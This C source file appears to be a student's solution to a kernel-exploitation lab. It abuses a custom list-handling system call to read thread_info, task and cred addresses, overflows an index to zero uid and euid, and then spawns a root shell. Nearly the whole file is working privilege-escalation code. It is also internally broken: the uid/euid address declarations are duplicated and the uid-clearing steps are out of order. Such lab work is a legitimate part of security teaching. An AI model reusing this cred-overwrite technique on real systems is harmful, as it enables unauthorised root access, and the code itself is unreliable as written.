#include <stdio.h>
#include <unistd.h>
void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.
    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
    //     For example:
    //     (gdb) print (int)&((struct thread_info*)0)->task
    //     will gives you the offset between struct thread_info and  thread_info->task
    // 2. Then you can make use of arbitrary read to get the address of struct task.
    // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.

    // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege


        //[:+:]-------------------------------------------My Code----------------------------------------------[:+:]//

        //Reset the list and use the syscall to get the address of the thread_info struct
        syscall(326, 0, NULL);
        unsigned long thrdAddy = syscall(326, 4, NULL);

        //Use the syscall to link the prev pointer of the first node onto thread_into, we will treat thread_info as if it were another node. 
        //Since the offset between threa_info and task* os 0, we dont need to add anything to thread_info address
        //thread_info's task* pointer is located in the same place that a regular node's 'prio' field would be.
        //This means, that when we invoke the syscall to get the prio from the first node's 'prev' it will instead take us to a portion of the task struct's address
        //Because the address is 8  bytes instad of 4 bytes, we would need to get the first 4 bytes, then left shift by 32 bits to make enough room to add the next 4 bytes
        syscall(326, 2, thrdAddy);
        unsigned long taskAddy1stHalf= syscall(326,3,NULL);

        //Since the address can only store 4 bytes, we have to move 4 bytes to get the second half of the address, then aquire it by invoking 'prio' like before
        syscall(326,2,thrdAddy-4);
        unsigned long taskAddy2ndHalf= syscall(326, 3,NULL);

        //We shift the first half by 32 bits to make room for the second half, then we combine them into one 8-byte long variable
        unsigned long taskAddyFull= (taskAddy1stHalf << 32) + taskAddy2ndHalf;
    
    
         //Getting the address of the cred stuct follows the same logic above for getting the address of the task struct. 
        //I Link the first node's  prev pointer to the address of the cred struct, which is found with the address task + an offset of 1456, found by using GDB
        //then hthe  same procedure as before is used to get the address of the cred struct one half at a time
        syscall(326, 2, taskAddyFull + 1456);
        unsigned long credAddy1stHalf= syscall(326,3,NULL);

        syscall(326,2, taskAddyFull + 1456-4);
        unsigned long credAddy2ndHalf= syscall(326,3,NULL);

        unsigned long credAddyFull= (credAddy1stHalf << 32) + credAddy2ndHalf;





        //Once the address of the cred struct is found, finding the addresses of uid and euid is trivial because we have the offsets from the GDB
        unsigned long uidAddr= credAddyFull + 4;
        unsigned  long euidAddr= credAddyFull + 20;

    
        //Once the address of the cred struct is found, finding the addresses of uid and euid is trivial because we have the offsets from the GDB
        unsigned long uidAddr= credAddyFull + 4;
        unsigned  long euidAddr= credAddyFull + 20;






        // the uid and euid are both uint8, which means they only hold 8 bits. This means, that if a value that is >= 2^8  (256) were to be put in uid, then it will be cleared. 
        // First, we insert 256 nodes, which puts the index at 255
        syscall(326,0,NULL);
        for(int i= 0; i<255; ++i){
                syscall(326,1,0);
        }

        //We want to target the uid variable, but since the 'next*' pointer points +8 spaces away, we have to direct the prev* with an offset od -8 to get to the first portion of the uid
        syscall(326,2,uidAddr -8);
    
    
        //Clearing the euid follows the same logic and procudure as clearing the uid above
        syscall(326,0,NULL);
        for(int i= 0; i<255; ++i){
                syscall(326,1,0);
        }
        syscall(326,2,euidAddr -8);
        syscall(326,1,-1);

        syscall(326,0,NULL);
        for(int j= 0; j<255; ++j){
                syscall(326,1,0);
        }
        syscall(326,2,euidAddr -7);
        syscall(326,1,-1);
        //[:+:]-----------------------------------------/My Code-----------------------------------------------[:+:]

        //Then, upon inserting our final node, the idx wil go up to 256, and prev's next pointer, which is linked to one half of uid, will recieve the value of idx and be cleared as a result
        syscall(326,1,-1);

        // We reset and reload the list again so we can get the next part of the uid
        syscall(326,0,NULL);
        for(int j= 0; j<255; ++j){
                syscall(326,1,0);
        }

        //For the second part of uid, we will use an offset of +1 greater, to get the value right next to it on the stack
        syscall(326,2,uidAddr -7);

        //we overflow it once again
        syscall(326,1,-1);


    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"euid = %d\n",geteuid());
    // The exploit itself
    runExploit();

    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid = %d\n",geteuid());

    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
    
